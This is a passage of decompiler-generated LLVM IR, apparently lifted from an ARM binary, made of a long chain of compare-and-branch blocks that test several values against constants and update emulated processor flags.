  store i1 %v4_f878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f878, label %dec_label_pc_f89c, label %dec_label_pc_f880

dec_label_pc_f880:                                ; preds = %dec_label_pc_f874
  %v2_f880 = icmp ugt i32 %v1_e874, 185
  store i1 %v2_f880, i1* %cpsr_c.global-to-local, align 1
  %v7_f880 = icmp eq i32 %v1_e874, 186
  store i1 %v7_f880, i1* %cpsr_z.global-to-local, align 1
  %v2_f884 = xor i1 %v2_f880, true
  %v3_f884 = or i1 %v7_f880, %v2_f884
  br i1 %v3_f884, label %bb1727, label %bb1728

bb1727:                                           ; preds = %dec_label_pc_f880
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1728

bb1728:                                           ; preds = %dec_label_pc_f880, %bb1727
  %v0_f894.pr960 = phi i32 [ %storemerge1255, %dec_label_pc_f880 ], [ 0, %bb1727 ]
  %v2_f888 = xor i1 %v7_f880, true
  %v3_f888 = and i1 %v2_f880, %v2_f888
  br i1 %v3_f888, label %bb1729, label %bb1730

bb1729:                                           ; preds = %bb1728
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1730

bb1730:                                           ; preds = %bb1728, %bb1729
  %v0_f894.pr = phi i32 [ %v0_f894.pr960, %bb1728 ], [ 1, %bb1729 ]
  %v2_f88c = icmp ugt i32 %v1_e874, 189
  store i1 %v2_f88c, i1* %cpsr_c.global-to-local, align 1
  %v7_f88c = icmp eq i32 %v1_e874, 190
  store i1 %v7_f88c, i1* %cpsr_z.global-to-local, align 1
  %v2_f890 = xor i1 %v7_f88c, true
  %v3_f890 = and i1 %v2_f88c, %v2_f890
  br i1 %v3_f890, label %.thread386, label %bb1731

.thread386:                                       ; preds = %bb1730
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f89c

bb1731:                                           ; preds = %bb1730
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f894 = icmp eq i32 %v0_f894.pr, 0
  store i1 %v2_f894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f894, label %dec_label_pc_f89c, label %dec_label_pc_e858

dec_label_pc_f89c:                                ; preds = %.thread386, %bb1731, %dec_label_pc_f874
  store i32 %.2028, i32* %r3.global-to-local, align 4
  store i1 %v2_f04c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f04c, label %.thread389, label %.thread390

.thread390:                                       ; preds = %dec_label_pc_f89c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f8d0

.thread389:                                       ; preds = %dec_label_pc_f89c
  store i32 %.2028, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8ac = icmp eq i1 %v7_f744, false
  store i1 %v2_f8ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8ac, label %dec_label_pc_f8d0, label %dec_label_pc_f8b4

dec_label_pc_f8b4:                                ; preds = %.thread389
  %v2_f8b4 = icmp ugt i32 %v1_e874, 118
  store i1 %v2_f8b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8b4 = icmp eq i32 %v1_e874, 119
  store i1 %v7_f8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_f8b8 = xor i1 %v2_f8b4, true
  %v3_f8b8 = or i1 %v7_f8b4, %v2_f8b8
  br i1 %v3_f8b8, label %bb1732, label %bb1733

bb1732:                                           ; preds = %dec_label_pc_f8b4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1733

bb1733:                                           ; preds = %dec_label_pc_f8b4, %bb1732
  %v0_f8c8.pr963 = phi i32 [ %.2028, %dec_label_pc_f8b4 ], [ 0, %bb1732 ]
  %v2_f8bc = xor i1 %v7_f8b4, true
  %v3_f8bc = and i1 %v2_f8b4, %v2_f8bc
  br i1 %v3_f8bc, label %bb1734, label %bb1735

bb1734:                                           ; preds = %bb1733
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1735

bb1735:                                           ; preds = %bb1733, %bb1734
  %v0_f8c8.pr = phi i32 [ %v0_f8c8.pr963, %bb1733 ], [ 1, %bb1734 ]
  %v2_f8c0 = icmp ugt i32 %v1_e874, 213
  store i1 %v2_f8c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f8c0 = icmp eq i32 %v1_e874, 214
  store i1 %v7_f8c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f8c4 = xor i1 %v7_f8c0, true
  %v3_f8c4 = and i1 %v2_f8c0, %v2_f8c4
  br i1 %v3_f8c4, label %.thread394, label %bb1736

.thread394:                                       ; preds = %bb1735
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f8d0

bb1736:                                           ; preds = %bb1735
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8c8 = icmp eq i32 %v0_f8c8.pr, 0
  store i1 %v2_f8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8c8, label %dec_label_pc_f8d0, label %dec_label_pc_e858

dec_label_pc_f8d0:                                ; preds = %.thread394, %.thread390, %bb1736, %.thread389
  store i32 %.2028, i32* %r3.global-to-local, align 4
  %v2_f8d4 = icmp ugt i32 %v1_e870, 150
  store i1 %v2_f8d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8d4 = icmp eq i32 %v1_e870, 151
  store i1 %v7_f8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8d4, label %.thread397, label %.thread398

.thread398:                                       ; preds = %dec_label_pc_f8d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f904

.thread397:                                       ; preds = %dec_label_pc_f8d0
  store i32 %.2028, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8e0 = icmp eq i1 %v7_f744, false
  store i1 %v2_f8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8e0, label %dec_label_pc_f904, label %dec_label_pc_f8e8

dec_label_pc_f8e8:                                ; preds = %.thread397
  %v2_f8e8 = icmp ugt i32 %v1_e874, 135
  store i1 %v2_f8e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8e8 = icmp eq i32 %v1_e874, 136
  store i1 %v7_f8e8, i1* %cpsr_z.global-to-local, align 1
  %v2_f8ec = xor i1 %v2_f8e8, true
  %v3_f8ec = or i1 %v7_f8e8, %v2_f8ec
  br i1 %v3_f8ec, label %bb1737, label %bb1738

bb1737:                                           ; preds = %dec_label_pc_f8e8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1738

bb1738:                                           ; preds = %dec_label_pc_f8e8, %bb1737
  %v0_f8fc.pr966 = phi i32 [ %.2028, %dec_label_pc_f8e8 ], [ 0, %bb1737 ]
  %v2_f8f0 = xor i1 %v7_f8e8, true
  %v3_f8f0 = and i1 %v2_f8e8, %v2_f8f0
  br i1 %v3_f8f0, label %bb1739, label %bb1740

bb1739:                                           ; preds = %bb1738
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1740

bb1740:                                           ; preds = %bb1738, %bb1739
  %v0_f8fc.pr = phi i32 [ %v0_f8fc.pr966, %bb1738 ], [ 1, %bb1739 ]
  %v2_f8f4 = icmp ugt i32 %v1_e874, 137
  store i1 %v2_f8f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8f4 = icmp eq i32 %v1_e874, 138
  store i1 %v7_f8f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f8f8 = xor i1 %v7_f8f4, true
  %v3_f8f8 = and i1 %v2_f8f4, %v2_f8f8
  br i1 %v3_f8f8, label %.thread402, label %bb1741

.thread402:                                       ; preds = %bb1740
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f904

bb1741:                                           ; preds = %bb1740
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8fc = icmp eq i32 %v0_f8fc.pr, 0
  store i1 %v2_f8fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8fc, label %dec_label_pc_f904, label %dec_label_pc_e858

dec_label_pc_f904:                                ; preds = %.thread402, %.thread398, %bb1741, %.thread397
  store i32 %.2001, i32* %r3.global-to-local, align 4
  %v2_f908 = icmp ugt i32 %v1_e870, 93
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  %v7_f908 = icmp eq i32 %v1_e870, 94
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f908, label %.thread405, label %.thread406

.thread406:                                       ; preds = %dec_label_pc_f904
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f928

.thread405:                                       ; preds = %dec_label_pc_f904
  store i32 %.2001, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f914 = icmp eq i1 %v7_ecb8, false
  store i1 %v2_f914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f914, label %dec_label_pc_f928, label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %.thread405
  %v2_f91c = icmp eq i32 %v1_e874, 255
  store i1 %v2_f91c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f91c, label %dec_label_pc_f928, label %bb1742

bb1742:                                           ; preds = %dec_label_pc_f91c
  %v3_f920 = icmp ugt i32 %v1_e874, 235
  store i1 %v3_f920, i1* %cpsr_c.global-to-local, align 1
  %v8_f920 = icmp eq i32 %v1_e874, 236
  store i1 %v8_f920, i1* %cpsr_z.global-to-local, align 1
  %v2_f924 = xor i1 %v8_f920, true
  %v3_f924 = and i1 %v3_f920, %v2_f924
  br i1 %v3_f924, label %dec_label_pc_e858, label %dec_label_pc_f928

dec_label_pc_f928:                                ; preds = %dec_label_pc_f91c, %.thread406, %bb1742, %.thread405
  %v0_f948.pr972 = phi i32 [ 0, %.thread406 ], [ %.2001, %bb1742 ], [ 0, %.thread405 ], [ %.2001, %dec_label_pc_f91c ]
  %v2_f928 = icmp ugt i32 %v1_e85c, 62
  store i1 %v2_f928, i1* %cpsr_c.global-to-local, align 1
  %v7_f928 = icmp eq i32 %v1_e85c, 63
  store i1 %v7_f928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f928, label %bb1743, label %dec_label_pc_f950

bb1743:                                           ; preds = %dec_label_pc_f928
  store i1 %v2_f224, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f224, label %dec_label_pc_f934, label %dec_label_pc_f950

dec_label_pc_f934:                                ; preds = %bb1743
  %v2_f934 = icmp ugt i32 %v1_e874, 17
  store i1 %v2_f934, i1* %cpsr_c.global-to-local, align 1
  %v7_f934 = icmp eq i32 %v1_e874, 18
  store i1 %v7_f934, i1* %cpsr_z.global-to-local, align 1
  %v2_f938 = xor i1 %v2_f934, true
  %v3_f938 = or i1 %v7_f934, %v2_f938
  br i1 %v3_f938, label %bb1744, label %bb1745

bb1744:                                           ; preds = %dec_label_pc_f934
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1745

bb1745:                                           ; preds = %dec_label_pc_f934, %bb1744
  %v0_f948.pr971 = phi i32 [ %v0_f948.pr972, %dec_label_pc_f934 ], [ 0, %bb1744 ]
  %v2_f93c = xor i1 %v7_f934, true
  %v3_f93c = and i1 %v2_f934, %v2_f93c
  br i1 %v3_f93c, label %bb1746, label %bb1747

bb1746:                                           ; preds = %bb1745
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1747

bb1747:                                           ; preds = %bb1745, %bb1746
  %v0_f948.pr = phi i32 [ %v0_f948.pr971, %bb1745 ], [ 1, %bb1746 ]
  %v2_f940 = icmp ugt i32 %v1_e874, 19
  store i1 %v2_f940, i1* %cpsr_c.global-to-local, align 1
  %v7_f940 = icmp eq i32 %v1_e874, 20
  store i1 %v7_f940, i1* %cpsr_z.global-to-local, align 1
  %v2_f944 = xor i1 %v7_f940, true
  %v3_f944 = and i1 %v2_f940, %v2_f944
  br i1 %v3_f944, label %.thread411, label %bb1748

.thread411:                                       ; preds = %bb1747
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f950

bb1748:                                           ; preds = %bb1747
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f948 = icmp eq i32 %v0_f948.pr, 0
  store i1 %v2_f948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f948, label %dec_label_pc_f950, label %dec_label_pc_e858

dec_label_pc_f950:                                ; preds = %dec_label_pc_f928, %.thread411, %bb1748, %bb1743
  %v0_f970.pr975 = phi i32 [ %v0_f948.pr972, %dec_label_pc_f928 ], [ 0, %.thread411 ], [ 0, %bb1748 ], [ %v0_f948.pr972, %bb1743 ]
  %v2_f950 = icmp ugt i32 %v1_e85c, 69
  store i1 %v2_f950, i1* %cpsr_c.global-to-local, align 1
  %v7_f950 = icmp eq i32 %v1_e85c, 70
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f950, label %bb1749, label %dec_label_pc_f978

bb1749:                                           ; preds = %dec_label_pc_f950
  %v3_f954 = icmp ugt i32 %v1_e870, 41
  store i1 %v3_f954, i1* %cpsr_c.global-to-local, align 1
  %v8_f954 = icmp eq i32 %v1_e870, 42
  store i1 %v8_f954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f954, label %dec_label_pc_f95c, label %dec_label_pc_f978

dec_label_pc_f95c:                                ; preds = %bb1749
  %v2_f95c = icmp ugt i32 %v1_e874, 71
  store i1 %v2_f95c, i1* %cpsr_c.global-to-local, align 1
  %v7_f95c = icmp eq i32 %v1_e874, 72
  store i1 %v7_f95c, i1* %cpsr_z.global-to-local, align 1
  %v2_f960 = xor i1 %v2_f95c, true
  %v3_f960 = or i1 %v7_f95c, %v2_f960
  br i1 %v3_f960, label %bb1750, label %bb1751

bb1750:                                           ; preds = %dec_label_pc_f95c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1751

bb1751:                                           ; preds = %dec_label_pc_f95c, %bb1750
  %v0_f970.pr974 = phi i32 [ %v0_f970.pr975, %dec_label_pc_f95c ], [ 0, %bb1750 ]
  %v2_f964 = xor i1 %v7_f95c, true
  %v3_f964 = and i1 %v2_f95c, %v2_f964
  br i1 %v3_f964, label %bb1752, label %bb1753

bb1752:                                           ; preds = %bb1751
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1753

bb1753:                                           ; preds = %bb1751, %bb1752
  %v0_f970.pr = phi i32 [ %v0_f970.pr974, %bb1751 ], [ 1, %bb1752 ]
  %v2_f968 = icmp ugt i32 %v1_e874, 73
  store i1 %v2_f968, i1* %cpsr_c.global-to-local, align 1
  %v7_f968 = icmp eq i32 %v1_e874, 74
  store i1 %v7_f968, i1* %cpsr_z.global-to-local, align 1
  %v2_f96c = xor i1 %v7_f968, true
  %v3_f96c = and i1 %v2_f968, %v2_f96c
  br i1 %v3_f96c, label %.thread416, label %bb1754

.thread416:                                       ; preds = %bb1753
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f978

bb1754:                                           ; preds = %bb1753
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f970 = icmp eq i32 %v0_f970.pr, 0
  store i1 %v2_f970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f970, label %dec_label_pc_f978, label %dec_label_pc_e858

dec_label_pc_f978:                                ; preds = %dec_label_pc_f950, %.thread416, %bb1754, %bb1749
  %v0_f9a4.pr978 = phi i32 [ %v0_f970.pr975, %dec_label_pc_f950 ], [ 0, %.thread416 ], [ 0, %bb1754 ], [ %v0_f970.pr975, %bb1749 ]
  %v7_f978 = icmp eq i32 %v1_e85c, 74
  %.2030 = zext i1 %v7_f978 to i32
  %v2_f984 = icmp ugt i32 %v1_e870, 90
  store i1 %v2_f984, i1* %cpsr_c.global-to-local, align 1
  %v7_f984 = icmp eq i32 %v1_e870, 91
  store i1 %v7_f984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f984, label %bb1757, label %dec_label_pc_f9ac

bb1757:                                           ; preds = %dec_label_pc_f978
  %v2_f978 = icmp ugt i32 %v1_e85c, 73
  store i1 %v2_f978, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f978, label %dec_label_pc_f990, label %dec_label_pc_f9ac

dec_label_pc_f990:                                ; preds = %bb1757
  %v2_f990 = icmp ugt i32 %v1_e874, 111
  store i1 %v2_f990, i1* %cpsr_c.global-to-local, align 1
  %v7_f990 = icmp eq i32 %v1_e874, 112
  store i1 %v7_f990, i1* %cpsr_z.global-to-local, align 1
  %v2_f994 = xor i1 %v2_f990, true
  %v3_f994 = or i1 %v7_f990, %v2_f994
  br i1 %v3_f994, label %bb1758, label %bb1759

bb1758:                                           ; preds = %dec_label_pc_f990
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1759

bb1759:                                           ; preds = %dec_label_pc_f990, %bb1758
  %v0_f9a4.pr977 = phi i32 [ %v0_f9a4.pr978, %dec_label_pc_f990 ], [ 0, %bb1758 ]
  %v2_f998 = xor i1 %v7_f990, true
  %v3_f998 = and i1 %v2_f990, %v2_f998
  br i1 %v3_f998, label %bb1760, label %bb1761

bb1760:                                           ; preds = %bb1759
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1761

bb1761:                                           ; preds = %bb1759, %bb1760
  %v0_f9a4.pr = phi i32 [ %v0_f9a4.pr977, %bb1759 ], [ 1, %bb1760 ]
  %v2_f99c = icmp ugt i32 %v1_e874, 113
  store i1 %v2_f99c, i1* %cpsr_c.global-to-local, align 1
  %v7_f99c = icmp eq i32 %v1_e874, 114
  store i1 %v7_f99c, i1* %cpsr_z.global-to-local, align 1
  %v2_f9a0 = xor i1 %v7_f99c, true
  %v3_f9a0 = and i1 %v2_f99c, %v2_f9a0
  br i1 %v3_f9a0, label %.thread422, label %bb1762

.thread422:                                       ; preds = %bb1761
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9ac

bb1762:                                           ; preds = %bb1761
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9a4 = icmp eq i32 %v0_f9a4.pr, 0
  store i1 %v2_f9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9a4, label %dec_label_pc_f9ac, label %dec_label_pc_e858

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f978, %.thread422, %bb1762, %bb1757
  %v2_f9ac = icmp ugt i32 %v1_e870, 200
  store i1 %v2_f9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f9ac = icmp eq i32 %v1_e870, 201
  store i1 %v7_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9ac, label %.thread425, label %.thread426

.thread426:                                       ; preds = %dec_label_pc_f9ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9dc

.thread425:                                       ; preds = %dec_label_pc_f9ac
  store i32 %.2030, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9b8 = icmp eq i1 %v7_f978, false
  store i1 %v2_f9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9b8, label %dec_label_pc_f9dc, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %.thread425
  %v2_f9c0 = icmp ugt i32 %v1_e874, 54
  store i1 %v2_f9c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c0 = icmp eq i32 %v1_e874, 55
  store i1 %v7_f9c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f9c4 = xor i1 %v2_f9c0, true
  %v3_f9c4 = or i1 %v7_f9c0, %v2_f9c4
  br i1 %v3_f9c4, label %bb1763, label %bb1764

bb1763:                                           ; preds = %dec_label_pc_f9c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1764

bb1764:                                           ; preds = %dec_label_pc_f9c0, %bb1763
  %v0_f9d4.pr981 = phi i32 [ %.2030, %dec_label_pc_f9c0 ], [ 0, %bb1763 ]
  %v2_f9c8 = xor i1 %v7_f9c0, true
  %v3_f9c8 = and i1 %v2_f9c0, %v2_f9c8
  br i1 %v3_f9c8, label %bb1765, label %bb1766

bb1765:                                           ; preds = %bb1764
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1766

bb1766:                                           ; preds = %bb1764, %bb1765
  %v0_f9d4.pr = phi i32 [ %v0_f9d4.pr981, %bb1764 ], [ 1, %bb1765 ]
  %v2_f9cc = icmp ugt i32 %v1_e874, 56
  store i1 %v2_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9cc = icmp eq i32 %v1_e874, 57
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f9d0 = xor i1 %v7_f9cc, true
  %v3_f9d0 = and i1 %v2_f9cc, %v2_f9d0
  br i1 %v3_f9d0, label %.thread430, label %bb1767

.thread430:                                       ; preds = %bb1766
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9dc

bb1767:                                           ; preds = %bb1766
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9d4 = icmp eq i32 %v0_f9d4.pr, 0
  store i1 %v2_f9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9d4, label %dec_label_pc_f9dc, label %dec_label_pc_e858

dec_label_pc_f9dc:                                ; preds = %.thread430, %.thread426, %bb1767, %.thread425
  %v2_f9e0 = icmp ugt i32 %v1_e870, 208
  store i1 %v2_f9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e0 = icmp eq i32 %v1_e870, 209
  %.2031 = zext i1 %v7_f9e0 to i32
  store i32 %.2031, i32* %r4.global-to-local, align 4
  %v2_f9ec = and i32 %.2031, %.2018
  %v4_f9ec = icmp eq i32 %v2_f9ec, 0
  store i1 %v4_f9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f9ec, label %dec_label_pc_fa10, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %dec_label_pc_f9dc
  %v2_f9f4 = icmp ugt i32 %v1_e874, 46
  store i1 %v2_f9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9f4 = icmp eq i32 %v1_e874, 47
  store i1 %v7_f9f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f9f8 = xor i1 %v2_f9f4, true
  %v3_f9f8 = or i1 %v7_f9f4, %v2_f9f8
  br i1 %v3_f9f8, label %bb1770, label %bb1771

bb1770:                                           ; preds = %dec_label_pc_f9f4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1771

bb1771:                                           ; preds = %dec_label_pc_f9f4, %bb1770
  %v2_f9fc = xor i1 %v7_f9f4, true
  %v3_f9fc = and i1 %v2_f9f4, %v2_f9fc
  br i1 %v3_f9fc, label %bb1772, label %bb1773

bb1772:                                           ; preds = %bb1771
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1773

bb1773:                                           ; preds = %bb1771, %bb1772
  %v0_fa08.pr = phi i32 [ 0, %bb1771 ], [ 1, %bb1772 ]
  %v2_fa00 = icmp ugt i32 %v1_e874, 51
  store i1 %v2_fa00, i1* %cpsr_c.global-to-local, align 1
  %v7_fa00 = icmp eq i32 %v1_e874, 52
  store i1 %v7_fa00, i1* %cpsr_z.global-to-local, align 1
  %v2_fa04 = xor i1 %v7_fa00, true
  %v3_fa04 = and i1 %v2_fa00, %v2_fa04
  br i1 %v3_fa04, label %.thread435, label %bb1774

.thread435:                                       ; preds = %bb1773
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa10

bb1774:                                           ; preds = %bb1773
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa08 = icmp eq i32 %v0_fa08.pr, 0
  store i1 %v2_fa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa08, label %dec_label_pc_fa10, label %dec_label_pc_e858

dec_label_pc_fa10:                                ; preds = %.thread435, %bb1774, %dec_label_pc_f9dc
  store i32 %.2018, i32* %r3.global-to-local, align 4
  %v2_fa14 = icmp ugt i32 %v1_e870, 164
  store i1 %v2_fa14, i1* %cpsr_c.global-to-local, align 1
  %v7_fa14 = icmp eq i32 %v1_e870, 165
  store i1 %v7_fa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa14, label %.thread438, label %.thread439

.thread439:                                       ; preds = %dec_label_pc_fa10
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa28

.thread438:                                       ; preds = %dec_label_pc_fa10
  store i32 %.2018, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa20 = icmp eq i1 %v7_f2d4, false
  store i1 %v2_fa20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa20, label %dec_label_pc_fa28, label %dec_label_pc_e858

dec_label_pc_fa28:                                ; preds = %.thread439, %.thread438
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  %v2_fa2c = icmp ugt i32 %v1_e85c, 148
  store i1 %v2_fa2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa2c = icmp eq i32 %v1_e85c, 149
  store i1 %v7_fa2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa2c, label %.thread442, label %.thread443

.thread443:                                       ; preds = %dec_label_pc_fa28
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa40

.thread442:                                       ; preds = %dec_label_pc_fa28
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa38 = icmp eq i1 %v7_ea88, false
  store i1 %v2_fa38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa38, label %dec_label_pc_fa40, label %dec_label_pc_e858

dec_label_pc_fa40:                                ; preds = %.thread443, %.thread442
  %v2_fa40 = icmp ugt i32 %v1_e85c, 150
  store i1 %v2_fa40, i1* %cpsr_c.global-to-local, align 1
  %v7_fa40 = icmp eq i32 %v1_e85c, 151
  store i1 %v7_fa40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa40, label %.thread446, label %.thread447

.thread447:                                       ; preds = %dec_label_pc_fa40
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa54

.thread446:                                       ; preds = %dec_label_pc_fa40
  store i32 %.1977, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa4c = icmp eq i1 %v7_e930, false
  store i1 %v2_fa4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa4c, label %dec_label_pc_fa54, label %dec_label_pc_e858

dec_label_pc_fa54:                                ; preds = %.thread447, %.thread446
  store i32 %.1990, i32* %r3.global-to-local, align 4
  %v2_fa58 = icmp ugt i32 %v1_e870, 131
  store i1 %v2_fa58, i1* %cpsr_c.global-to-local, align 1
  %v7_fa58 = icmp eq i32 %v1_e870, 132
  store i1 %v7_fa58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa58, label %.thread450, label %.thread451

.thread451:                                       ; preds = %dec_label_pc_fa54
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa6c

.thread450:                                       ; preds = %dec_label_pc_fa54
  store i32 %.1990, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa64 = icmp eq i1 %v7_eb44, false
  store i1 %v2_fa64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa64, label %dec_label_pc_fa6c, label %dec_label_pc_e858

dec_label_pc_fa6c:                                ; preds = %.thread451, %.thread450
  %v2_fa6c = icmp ugt i32 %v1_e85c, 175
  store i1 %v2_fa6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa6c = icmp eq i32 %v1_e85c, 176
  store i1 %v7_fa6c, i1* %cpsr_z.global-to-local, align 1
